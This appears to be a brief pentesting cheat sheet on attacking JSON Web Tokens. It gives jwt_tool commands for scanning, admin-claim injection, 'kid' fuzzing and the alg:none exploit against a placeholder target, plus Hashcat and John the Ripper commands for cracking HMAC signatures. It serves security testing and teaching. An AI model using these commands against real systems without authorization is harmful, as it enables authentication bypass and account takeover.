---
title: Json Web Token (JWT) Pentesting
desc:
tags: [Cryptography, Hashcat, JSON, JWT, Token, Web]
alts: []
render_with_liquid: false
---

## 1. Decode JWT

1. **Use Online Tools**

    - **[JWT.io](https://jwt.io/){:target="_blank"}**

        JWT Decoder and Encoder.

2. **Use JWT Toolkit**

    **[JWT Toolkit](https://github.com/ticarpi/jwt_tool){:target="_blank"}** is a toolkit for testing, tweaking and cracking JWT.

    ```sh
    python jwt_tool.py <Base64_Encoded_JWT>
    ```

## 1. Automation

1. **Use JWT Toolkit**

    1. **Scan**

        ```sh
        # -t: Target URL
        # -rc: Cookies
        # -M pb: Playbook Scan Mode
        # -cv: Canary Value
        python jwt_tool.py -t https://vulnerable.com/admin -rc "jwt=<Base64_Encoded_JWT>;anothercookie=test" -M pb -cv "not authorized"
        ```

    2. **Exploit**

        ```sh
        # -X i: Exploit (inject inline)
        # -I -pc username -pv admin: Inject Claim ("username": admin)
        python jwt_tool.py -t https://vulnerable.com/admin -rc "jwt=<Base64_Encoded_JWT>;anothercookie=test" -X i -I -pc username -pv admin
        ```

    3. **Fuzzing**

        ```sh
        # -I -hc kid -hv wordlist.txt: Inject Claim ("kid": FUZZ)
        python jwt_tool.py -t https://vulnerable.com/admin -rc "jwt=<Base64_Encoded_JWT>;anothercookie=test" -I -hc kid -hv wordlist.txt
        ```

## 2. Manual Pentesting

1. **Use JWT Toolkit**

    ```sh
    # Tamper (Manual Exploit)
    python jwt_tool.py <Base64_Encoded_JWT> -T

    # Exploit (Automated Exploit)
    # -X a: Exploit (alg: none)
    python jwt_tool.py <Base64_Encoded_JWT> -X a
    ```

<br />

## 2. Crack JWT Signature

First of all, you need to put the JWT into the text file.

```sh
echo -n '<Base64_Encoded_JWT>' > jwt.txt
```

Then crack the hash using John the Ripper or Hashcat.

```sh
john --format=HMAC-SHA256 --wordlist=/usr/share/wordlists/rockyou.txt jwt.txt

hashcat -a 0 -m 16500 jwt.txt passwords.txt
hashcat -a 0 -m 16500 jwt.txt passwords.txt -r rules/best64.rule
hashcat -a 3 -m 16500 jwt.txt '?u?l?l?l?l?l?l?l' -i --increment-min=6
```